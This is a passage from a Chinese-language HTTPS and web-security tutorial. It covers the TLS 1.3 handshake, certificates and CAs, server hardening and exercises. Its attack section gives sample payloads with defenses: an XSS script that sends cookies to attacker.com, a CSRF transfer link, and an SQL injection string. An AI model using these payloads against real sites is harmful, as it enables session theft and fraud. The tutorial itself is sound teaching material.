class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TLS 1.3的优化：<br><br><span class="hljs-bullet">1.</span> 1-RTT握手<br><span class="hljs-bullet">   -</span> TLS 1.2：2-RTT<br><span class="hljs-bullet">   -</span> TLS 1.3：1-RTT<br><span class="hljs-bullet">   -</span> 更快！<br><br><span class="hljs-bullet">2.</span> 0-RTT恢复<br><span class="hljs-bullet">   -</span> 会话恢复<br><span class="hljs-bullet">   -</span> 直接发送数据<br><span class="hljs-bullet">   -</span> 最快！<br><br><span class="hljs-bullet">3.</span> 简化密码套件<br><span class="hljs-bullet">   -</span> 移除不安全算法<br><span class="hljs-bullet">   -</span> 只保留AEAD<br><span class="hljs-bullet">   -</span> 更安全！<br><br>流程：<br><br>客户端                           服务器<br><br><span class="hljs-bullet">1.</span> ClientHello + KeyShare<br>   ───────────────────────────&gt;<br><span class="hljs-bullet">   -</span> 支持的加密套件<br><span class="hljs-bullet">   -</span> 密钥交换参数（猜测）<br><span class="hljs-bullet">   -</span> 随机数<br><br><span class="hljs-bullet">2.</span> ServerHello + KeyShare<br><span class="hljs-bullet">   +</span> Certificate<br><span class="hljs-bullet">   +</span> Finished<br>   &lt;───────────────────────────<br><span class="hljs-bullet">   -</span> 选择的加密套件<br><span class="hljs-bullet">   -</span> 密钥交换参数<br><span class="hljs-bullet">   -</span> 证书<br><span class="hljs-bullet">   -</span> 完成<br><br><span class="hljs-bullet">3.</span> Finished<br>   ───────────────────────────&gt;<br><br><span class="hljs-bullet">4.</span> 应用数据（加密）<br>   &lt;═══════════════════════════&gt;<br><br>握手完成！<br>RTT：1-RTT（快一倍）<br></code></pre></td></tr></table></figure><hr><h2 id="5-数字证书"><a href="#5-数字证书" class="headerlink" title="5. 数字证书"></a>5. 数字证书</h2><h3 id="5-1-什么是数字证书？"><a href="#5-1-什么是数字证书？" class="headerlink" title="5.1 什么是数字证书？"></a>5.1 什么是数字证书？</h3><p><strong>证书 &#x3D; 服务器的身份证</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">数字证书包含：<br><span class="hljs-bullet">- </span>域名（example.com）<br><span class="hljs-bullet">- </span>公钥<br><span class="hljs-bullet">- </span>证书颁发机构（CA）<br><span class="hljs-bullet">- </span>有效期<br><span class="hljs-bullet">- </span>CA的数字签名<br><br>作用：<br>证明&quot;这个公钥确实属于example.com&quot;<br><br>生活类比：<br>身份证：<br><span class="hljs-bullet">- </span>照片<br><span class="hljs-bullet">- </span>姓名<br><span class="hljs-bullet">- </span>身份证号<br><span class="hljs-bullet">- </span>公安局盖章<br><br>数字证书：<br><span class="hljs-bullet">- </span>公钥<br><span class="hljs-bullet">- </span>域名<br><span class="hljs-bullet">- </span>序列号<br><span class="hljs-bullet">- </span>CA签名<br></code></pre></td></tr></table></figure><h3 id="5-2-CA（证书颁发机构）"><a href="#5-2-CA（证书颁发机构）" class="headerlink" title="5.2 CA（证书颁发机构）"></a>5.2 CA（证书颁发机构）</h3><p><strong>信任链</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">证书信任链：<br><br>根CA（Root CA）<br>  └─ 中间CA（Intermediate CA）<br><span class="hljs-code">      └─ 网站证书（End-entity Certificate）</span><br><span class="hljs-code"></span><br>示例：<br>DigiCert Root CA<br>  └─ DigiCert SHA2 Secure Server CA<br><span class="hljs-code">      └─ example.com</span><br><span class="hljs-code"></span><br>验证过程：<br><span class="hljs-bullet">1.</span> 浏览器收到example.com证书<br><span class="hljs-bullet">2.</span> 验证example.com证书的签名（用中间CA公钥）<br><span class="hljs-bullet">3.</span> 验证中间CA证书的签名（用根CA公钥）<br><span class="hljs-bullet">4.</span> 检查根CA是否在信任列表中<br><br>根CA：<br><span class="hljs-bullet">-</span> 预装在操作系统/浏览器中<br><span class="hljs-bullet">-</span> 数量有限（约200个）<br><span class="hljs-bullet">-</span> 高度可信<br></code></pre></td></tr></table></figure><p><strong>著名CA</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">商业CA：<br><span class="hljs-bullet">- </span>DigiCert<br><span class="hljs-bullet">- </span>GlobalSign<br><span class="hljs-bullet">- </span>GoDaddy<br><span class="hljs-bullet">- </span>Comodo（现在叫Sectigo）<br><br>免费CA：<br><span class="hljs-bullet">- </span>Let&#x27;s Encrypt（最流行）<br><span class="hljs-bullet">- </span>ZeroSSL<br><span class="hljs-bullet">- </span>Cloudflare<br><br>自签名证书：<br><span class="hljs-bullet">- </span>自己给自己签名<br><span class="hljs-bullet">- </span>不被信任<br><span class="hljs-bullet">- </span>只用于测试<br></code></pre></td></tr></table></figure><h3 id="5-3-证书类型"><a href="#5-3-证书类型" class="headerlink" title="5.3 证书类型"></a>5.3 证书类型</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs markdown">按验证级别：<br><br><span class="hljs-bullet">1.</span> DV（Domain Validation）<br><span class="hljs-bullet">   -</span> 域名验证<br><span class="hljs-bullet">   -</span> 最基础<br><span class="hljs-bullet">   -</span> 验证：拥有域名控制权<br><span class="hljs-bullet">   -</span> 用途：个人网站、博客<br><span class="hljs-bullet">   -</span> 价格：免费/便宜<br><br><span class="hljs-bullet">2.</span> OV（Organization Validation）<br><span class="hljs-bullet">   -</span> 组织验证<br><span class="hljs-bullet">   -</span> 中等<br><span class="hljs-bullet">   -</span> 验证：域名 + 组织真实性<br><span class="hljs-bullet">   -</span> 用途：企业网站<br><span class="hljs-bullet">   -</span> 价格：中等<br><br><span class="hljs-bullet">3.</span> EV（Extended Validation）<br><span class="hljs-bullet">   -</span> 扩展验证<br><span class="hljs-bullet">   -</span> 最高级<br><span class="hljs-bullet">   -</span> 验证：严格的组织审查<br><span class="hljs-bullet">   -</span> 显示：绿色地址栏（旧版浏览器）<br><span class="hljs-bullet">   -</span> 用途：银行、电商<br><span class="hljs-bullet">   -</span> 价格：昂贵<br><br>按覆盖范围：<br><br><span class="hljs-bullet">1.</span> 单域名证书<br>   example.com ✅<br>   www.example.com ❌<br><br><span class="hljs-bullet">2.</span> 通配符证书<br>   example.com ✅<br>   www.example.com ✅<br>   api.example.com ✅<br>   <span class="hljs-emphasis">*.example.com ✅</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">3. 多域名证书（SAN）</span><br><span class="hljs-emphasis">   example.com ✅</span><br><span class="hljs-emphasis">   example.net ✅</span><br><span class="hljs-emphasis">   example.org ✅</span><br></code></pre></td></tr></table></figure><h3 id="5-4-证书格式"><a href="#5-4-证书格式" class="headerlink" title="5.4 证书格式"></a>5.4 证书格式</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs ldif">PEM（Privacy Enhanced Mail）<br><span class="hljs-literal">-</span> 最常用<br><span class="hljs-literal">-</span> Base64编码<br><span class="hljs-literal">-</span> 文本格式<br><span class="hljs-literal">-</span> 扩展名：.pem, .crt, .cer, .key<br><br>示例：<br><span class="hljs-literal">-</span>----BEGIN CERTIFICATE-----<br>MIIDXTCCAkWgAwIBAgIJAKL0UG+mRbSjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV<br>...<br><span class="hljs-literal">-</span>----END CERTIFICATE-----<br><br>DER（Distinguished Encoding Rules）<br><span class="hljs-literal">-</span> 二进制格式<br><span class="hljs-literal">-</span> 扩展名：.der, .cer<br><br>PKCS<span class="hljs-comment">#12 / PFX</span><br><span class="hljs-literal">-</span> 包含证书和私钥<br><span class="hljs-literal">-</span> 有密码保护<br><span class="hljs-literal">-</span> 扩展名：.p12, .pfx<br><span class="hljs-literal">-</span> 用于导入/导出<br><br>证书链文件：<br><span class="hljs-literal">-</span> 包含多个证书<br><span class="hljs-literal">-</span> 从网站证书到根CA<br><span class="hljs-literal">-</span> fullchain.pem<br></code></pre></td></tr></table></figure><hr><h2 id="6-常见Web安全攻击"><a href="#6-常见Web安全攻击" class="headerlink" title="6. 常见Web安全攻击"></a>6. 常见Web安全攻击</h2><h3 id="6-1-中间人攻击（MITM）"><a href="#6-1-中间人攻击（MITM）" class="headerlink" title="6.1 中间人攻击（MITM）"></a>6.1 中间人攻击（MITM）</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击场景：<br><br>正常通信：<br>客户端 ←───────────→ 服务器<br><br>中间人攻击：<br>客户端 ←─→ 攻击者 ←─→ 服务器<br><span class="hljs-code">         （冒充）</span><br><span class="hljs-code"></span><br>攻击步骤：<br><span class="hljs-bullet">1.</span> 客户端请求连接服务器<br><span class="hljs-bullet">2.</span> 攻击者截获请求<br><span class="hljs-bullet">3.</span> 攻击者连接服务器<br><span class="hljs-bullet">4.</span> 攻击者冒充服务器与客户端通信<br><span class="hljs-bullet">5.</span> 攻击者窃听/篡改数据<br><br>防御：<br>✅ 使用HTTPS<br>✅ 验证证书<br>✅ 证书固定（Certificate Pinning）<br>✅ HSTS（强制HTTPS）<br></code></pre></td></tr></table></figure><h3 id="6-2-SSL剥离攻击"><a href="#6-2-SSL剥离攻击" class="headerlink" title="6.2 SSL剥离攻击"></a>6.2 SSL剥离攻击</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">攻击原理：<br>将HTTPS降级为HTTP<br><br>攻击步骤：<br><span class="hljs-bullet">1.</span> 用户访问 http://bank.com<br><span class="hljs-bullet">2.</span> 服务器重定向 https://bank.com<br><span class="hljs-bullet">3.</span> 攻击者截获重定向<br><span class="hljs-bullet">4.</span> 攻击者与服务器建立HTTPS连接<br><span class="hljs-bullet">5.</span> 攻击者与客户端使用HTTP通信<br><span class="hljs-bullet">6.</span> 客户端以为在用HTTPS（其实是HTTP）<br><br>防御：<br>✅ HSTS（强制HTTPS，不允许降级）<br>✅ 不使用HTTP版本<br>✅ 浏览器直接输入https://<br></code></pre></td></tr></table></figure><h3 id="6-3-证书欺诈"><a href="#6-3-证书欺诈" class="headerlink" title="6.3 证书欺诈"></a>6.3 证书欺诈</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">攻击方式：<br><span class="hljs-bullet">- </span>自签名证书<br><span class="hljs-bullet">- </span>伪造证书<br><span class="hljs-bullet">- </span>过期证书<br><br>防御：<br>✅ 浏览器证书验证<br>✅ 证书透明度（CT）<br>✅ 公钥固定<br>✅ 警惕证书警告<br></code></pre></td></tr></table></figure><h3 id="6-4-其他攻击"><a href="#6-4-其他攻击" class="headerlink" title="6.4 其他攻击"></a>6.4 其他攻击</h3><p><strong>XSS（跨站脚本攻击）</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">原理：<br>注入恶意JavaScript代码<br><br>示例：<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 盗取Cookie</span></span><br><span class="language-javascript">  <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://attacker.com/?c=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>防御：<br>✅ 输入验证和过滤<br>✅ 输出编码<br>✅ Content-Security-Policy<br>✅ HttpOnly Cookie<br></code></pre></td></tr></table></figure><p><strong>CSRF（跨站请求伪造）</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">原理：<br>利用用户已登录状态，发起恶意请求<br><br>攻击：<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://bank.com/transfer?to=attacker&amp;amount=1000&quot;</span>&gt;<br><br>防御：<br>✅ CSRF Token<br>✅ SameSite Cookie<br>✅ 验证Referer<br>✅ 二次确认<br></code></pre></td></tr></table></figure><p><strong>SQL注入</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">原理：<br>注入<span class="hljs-keyword">SQL</span>代码<br><br>示例：<br>用户名：<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><span class="hljs-keyword">SQL</span>：<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span><br>结果：返回所有用户<br><br>防御：<br>✅ 参数化查询<br>✅ ORM框架<br>✅ 输入验证<br>✅ 最小权限<br></code></pre></td></tr></table></figure><hr><h2 id="7-HTTPS最佳实践"><a href="#7-HTTPS最佳实践" class="headerlink" title="7. HTTPS最佳实践"></a>7. HTTPS最佳实践</h2><h3 id="7-1-服务器配置"><a href="#7-1-服务器配置" class="headerlink" title="7.1 服务器配置"></a>7.1 服务器配置</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. 只使用TLS <span class="hljs-number">1</span>.<span class="hljs-number">2</span>和TLS <span class="hljs-number">1</span>.<span class="hljs-number">3</span><br>   <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br><br><span class="hljs-attribute">2</span>. 选择强加密套件<br>   <span class="hljs-attribute">ssl_ciphers</span> &#x27;ECDHE-ECDSA-AES128-GCM-SHA256:...&#x27;;<br>   <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-attribute">3</span>. 启用HSTS<br>   <span class="hljs-attribute">Strict</span>-Transport-Security: max-age=<span class="hljs-number">31536000</span>; includeSubDomains<br><br><span class="hljs-attribute">4</span>. 启用OCSP Stapling<br>   <span class="hljs-attribute">ssl_stapling</span> <span class="hljs-literal">on</span>;<br>   <span class="hljs-attribute">ssl_stapling_verify</span> <span class="hljs-literal">on</span>;<br><br><span class="hljs-attribute">5</span>. 配置会话缓存<br>   <span class="hljs-attribute">ssl_session_cache</span> shared:SSL:<span class="hljs-number">10</span>m;<br>   <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">10</span>m;<br><br><span class="hljs-attribute">6</span>. 使用证书链<br>   <span class="hljs-attribute">ssl_certificate</span> /path/to/fullchain.pem;<br>   <span class="hljs-attribute">ssl_certificate_key</span> /path/to/privkey.pem;<br></code></pre></td></tr></table></figure><h3 id="7-2-安全头部"><a href="#7-2-安全头部" class="headerlink" title="7.2 安全头部"></a>7.2 安全头部</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> <span class="hljs-keyword">Strict</span>-Transport-<span class="hljs-keyword">Security</span>（HSTS）<br>   <span class="hljs-keyword">Strict</span>-Transport-<span class="hljs-keyword">Security</span>: max-age=<span class="hljs-number">31536000</span>; includeSubDomains; preload<br>   强制使用HTTPS<br><br><span class="hljs-number">2.</span> Content-<span class="hljs-keyword">Security</span>-<span class="hljs-keyword">Policy</span>（CSP）<br>   Content-<span class="hljs-keyword">Security</span>-<span class="hljs-keyword">Policy</span>: <span class="hljs-keyword">default</span>-src <span class="hljs-string">&#x27;self&#x27;</span><br>   防止XSS攻击<br><br><span class="hljs-number">3.</span> X-Content-<span class="hljs-keyword">Type</span>-<span class="hljs-keyword">Options</span><br>   X-Content-<span class="hljs-keyword">Type</span>-<span class="hljs-keyword">Options</span>: nosniff<br>   防止MIME类型嗅探<br><br><span class="hljs-number">4.</span> X-Frame-<span class="hljs-keyword">Options</span><br>   X-Frame-<span class="hljs-keyword">Options</span>: DENY<br>   防止点击劫持<br><br><span class="hljs-number">5.</span> X-XSS-Protection<br>   X-XSS-Protection: <span class="hljs-number">1</span>; mode=block<br>   防止XSS攻击<br><br><span class="hljs-number">6.</span> Referrer-<span class="hljs-keyword">Policy</span><br>   Referrer-<span class="hljs-keyword">Policy</span>: <span class="hljs-keyword">no</span>-referrer-<span class="hljs-keyword">when</span>-downgrade<br>   控制Referer信息<br></code></pre></td></tr></table></figure><h3 id="7-3-证书管理"><a href="#7-3-证书管理" class="headerlink" title="7.3 证书管理"></a>7.3 证书管理</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 自动续期<br><span class="hljs-bullet">   -</span> 使用Let&#x27;s Encrypt + Certbot<br><span class="hljs-bullet">   -</span> 设置定时任务<br><span class="hljs-bullet">   -</span> 避免证书过期<br><br><span class="hljs-bullet">2.</span> 证书监控<br><span class="hljs-bullet">   -</span> 监控证书有效期<br><span class="hljs-bullet">   -</span> 提前30天告警<br><span class="hljs-bullet">   -</span> 自动化流程<br><br><span class="hljs-bullet">3.</span> 多域名管理<br><span class="hljs-bullet">   -</span> 使用通配符证书<br><span class="hljs-bullet">   -</span> 或SAN证书<br><span class="hljs-bullet">   -</span> 统一管理<br><br><span class="hljs-bullet">4.</span> 证书透明度<br><span class="hljs-bullet">   -</span> 提交证书到CT日志<br><span class="hljs-bullet">   -</span> 监控证书颁发<br></code></pre></td></tr></table></figure><hr><h2 id="8-实战项目：HTTPS服务器"><a href="#8-实战项目：HTTPS服务器" class="headerlink" title="8. 实战项目：HTTPS服务器"></a>8. 实战项目：HTTPS服务器</h2><h3 id="8-1-项目需求"><a href="#8-1-项目需求" class="headerlink" title="8.1 项目需求"></a>8.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能需求：<br><span class="hljs-bullet">1.</span> 生成自签名证书<br><span class="hljs-bullet">2.</span> 实现HTTPS服务器<br><span class="hljs-bullet">3.</span> 实现HTTPS客户端<br><span class="hljs-bullet">4.</span> 验证证书<br><span class="hljs-bullet">5.</span> 加密通信<br><br>技术要求：<br><span class="hljs-bullet">-</span> 使用Python ssl模块<br><span class="hljs-bullet">-</span> 支持TLS 1.2+<br><span class="hljs-bullet">-</span> 证书验证<br><span class="hljs-bullet">-</span> 安全配置<br></code></pre></td></tr></table></figure><h3 id="8-2-工具演示"><a href="#8-2-工具演示" class="headerlink" title="8.2 工具演示"></a>8.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 生成自签名证书</span><br>python day20_cert_generator.py<br><br><span class="hljs-comment"># 2. 启动HTTPS服务器</span><br>python day20_https_server.py --host 0.0.0.0 --port 8443<br><br><span class="hljs-comment"># 3. 测试HTTPS客户端</span><br>python day20_https_client.py --url https://127.0.0.1:8443/<br></code></pre></td></tr></table></figure><hr><h2 id="9-今日练习"><a href="#9-今日练习" class="headerlink" title="9. 今日练习"></a>9. 今日练习</h2><h3 id="练习1：证书分析"><a href="#练习1：证书分析" class="headerlink" title="练习1：证书分析"></a>练习1：证书分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看证书信息</span><br>openssl x509 -<span class="hljs-keyword">in</span> cert.pem -text -noout<br><br><span class="hljs-comment"># 验证证书</span><br>openssl verify -CAfile ca.pem cert.pem<br><br><span class="hljs-comment"># 查看网站证书</span><br>openssl s_client -connect www.baidu.com:443 -showcerts<br></code></pre></td></tr></table></figure><h3 id="练习2：抓包分析"><a href="#练习2：抓包分析" class="headerlink" title="练习2：抓包分析"></a>练习2：抓包分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用Wireshark抓包</span><br><span class="hljs-comment"># 1. 分析TLS握手过程</span><br><span class="hljs-comment"># 2. 查看证书交换</span><br><span class="hljs-comment"># 3. 观察加密数据</span><br><br><span class="hljs-comment"># 使用tcpdump</span><br><span class="hljs-built_in">sudo</span> tcpdump -i any -w https.pcap port 443<br></code></pre></td></tr></table></figure><h3 id="练习3：配置HTTPS"><a href="#练习3：配置HTTPS" class="headerlink" title="练习3：配置HTTPS"></a>练习3：配置HTTPS</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 为第19天的HTTP服务器添加HTTPS支持</span><br><span class="hljs-comment"># 1. 生成证书</span><br><span class="hljs-comment"># 2. 配置SSL</span><br><span class="hljs-comment"># 3. 测试HTTPS连接</span><br></code></pre></td></tr></table></figure><h3 id="练习4：安全测试"><a href="#练习4：安全测试" class="headerlink" title="练习4：安全测试"></a>练习4：安全测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用SSL Labs测试网站安全性</span><br><span class="hljs-comment"># https://www.ssllabs.com/ssltest/</span><br><br><span class="hljs-comment"># 检查项目：</span><br><span class="hljs-comment"># - 证书有效性</span><br><span class="hljs-comment"># - 协议支持</span><br><span class="hljs-comment"># - 加密套件</span><br><span class="hljs-comment"># - 安全漏洞</span><br></code></pre></td></tr></table></figure><hr><h2 id="10-常见问题"><a href="#10-常见问题" class="headerlink" title="10. 常见问题"></a>10. 常见问题</h2><p><strong>Q1：HTTPS会影响性能吗？</strong></p><p>A：</p><ul><li>有一定影响，但可以接受</li><li>TLS 1.3大幅优化</li><li>使用HTTP&#x2F;2可以提升性能</li><li>CDN可以分担负载</li></ul><p><strong>Q2：自签名证书和CA签名证书有什么区别？</strong></p><p>A：</p><ul><li>自签名：自己签名，不被信任</li><li>CA签名：权威机构签名，被信任</li><li>自签名只用于测试</li><li>生产环境必须用CA证书</li></ul><p><strong>Q3：Let’s 